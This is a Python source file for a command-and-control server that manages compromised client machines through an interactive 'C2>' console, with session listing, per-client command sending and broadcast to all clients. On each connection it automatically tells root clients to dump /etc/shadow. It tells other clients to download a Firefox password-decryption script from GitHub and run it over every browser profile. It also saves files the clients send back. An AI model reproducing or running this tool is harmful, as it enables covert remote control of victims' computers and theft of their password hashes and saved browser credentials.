import socket
import threading
import subprocess
import sys
import time
import json
import base64

clients = {}
client_id = 0
lock = threading.Lock()

def handle_client(client_socket, client_address, cid):
    """handle individual client connection"""
    print(f"[+] New connection: ID {cid} from {client_address}")
    
    # get the json of user metadata
    data = client_socket.recv(4096).decode('utf-8', errors='ignore')
    identity = json.loads(data)
    print(f"[+] ID {cid} connected as {identity['user']}@{identity['hostname']} , Working directory: {identity['cwd']}")
    # store the data meaningfully
    with lock:
        clients[cid] = {
        "socket": client_socket,
        "user": identity["user"],
        "hostname": identity["hostname"],
        "cwd": identity["cwd"]
        }
    
    username = identity["user"]
    
    if username == "root":
        try:
            command = "cat /etc/shadow"
            client_socket.send(command.encode("utf-8"))
            print(f"[+] Sent auto-command to {username}")
        except Exception as e:
            print(f"[!] Failed to send auto-command: {e}")
    else:
        try:	
    	    # get the firefox_decrypt.py file
            command = "wget https://raw.githubusercontent.com/SJMetz/SCN-DUCKY-REPO/refs/heads/main/firefox_decrypt.py"
            client_socket.send(command.encode("utf-8"))
            command = "for profile in ~/.mozilla/firefox/*.default*; do   echo \"Processing $profile\";   python3.9 firefox_decrypt.py \"$profile\" > \"$(basename \"$profile\").json\"; done"
            client_socket.send(command.encode("utf-8"))
            print(f"[+] Sent auto-command to {username}")
        except Exception as e:
            print(f"[!] Failed to send auto-command: {e}")
        #comment    
    try:
        while True:
            # recieve command response from client
            data = client_socket.recv(4096).decode('utf-8', errors='ignore')

            if data.startswith("FILE|"):
                try:
                    _, filename, encoded = data.split("|", 2)

   
                    file_data = base64.b64decode(encoded)

                    with open(f"received_{filename}", "wb") as f:
                        f.write(file_data)

                    print(f"[+] Saved file: {filename}")
                    
                except Exception as e:
                    print(f"[!] File handling error: {e}")

            elif data.startswith("OUTPUT|"):
                print(data.split("|", 1)[1])

            elif data.startswith("ERROR|"):
                print("[!] ", data)
            else:
                print(f"[ID {cid}] {data}")
            
            
            #print(f"[ID {cid} Response: {data}")
    except Exception as e:
        print(f"[!] Error with client ID {cid} disconnected")
    finally:
        with lock:
            del clients[cid]
        client_socket.close()
        print(f"[-] Client ID {cid} disconnected")

def broadcast_command(command):
    #Send command to all clients
    with lock:
        for cid, info in clients.items():
            try:
                info["socket"].send(command.encode('utf-8'))
                print(f"[*] sent command to ID {cid}")
            except Exception as e:
                print(f"[!] Error sending ID {cid}: {e}")

def send_command_to_client(cid, command):
    #send command to specific client
    with lock:
        session = clients.get(cid)
        if not session:
            print(f"[!] Client ID {cid} not found")
            return
                
        try:
            session["socket"].send(command.encode('utf-8'))
            print(f"[*] sent command to ID {cid}")
        except Exception as e:
            print(f"[!] Error sending to ID {cid}: {e}")

def list_sessions():
    # list all active client sessions
    with lock:
        if not clients:
            print("[!] no active sessions")
        else:
            print("[*] Active sessions:")
            for cid, session in clients.items():
                print(f"[{cid}] {session['user']}@{session['hostname']} | cwd: {session['cwd']}")
                    

def server_shell():
    #interactive shell
    global client_id
    while True:
        cmd = input("C2> ").strip()
        if cmd == "sessions":
            list_sessions()
        elif cmd.startswith("interact "):
            try:
                cid = int(cmd.split()[1])
                if cid in clients:
                    print(f"[*] Interacting with ID {cid}. Type 'background' to exit.")
                    while True:
                        sub_cmd = input(f"ID {cid}> ").strip()
                        if sub_cmd == "background":
                            break
                        elif sub_cmd:
                            send_command_to_client(cid, sub_cmd)
                else:
                    print(f"[!] Client ID {cid} not found")
            except (IndexError, ValueError):
                print("[!] Usage: interact <client_id>")
        elif cmd.startswith("broadcast "):
            command = cmd[10:].strip()
            if command:
                broadcast_command(command)
            else:
                print("[!] Usage: broadcast <command>")
        elif cmd == "exit":
            with lock:
                for client_socket in clients.values():
                    client_socket.close()
            sys.exit(0)
        else:
            print("[!] Commands: sessions, interact <id>, broadcast <cmd>, exit")

def main():
    #main server function
    global client_id
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server.bind(('0.0.0.0', 4444))
    server.listen(5)
    print("[*] Server started on port 4444")

    # start server shell in seperate thread
    threading.Thread(target=server_shell, daemon=True).start()

    try:
        while True:
            client_socket, client_address = server.accept()
            with lock:
                client_id += 1
                client_thread = threading.Thread(target=handle_client, args=(client_socket, client_address, client_id))
                client_thread.daemon = True
                client_thread.start()
    except KeyboardInterrupt:
        print("\n[!] Shutting down server")
        server.close()

if __name__ == "__main__":
    main()
    
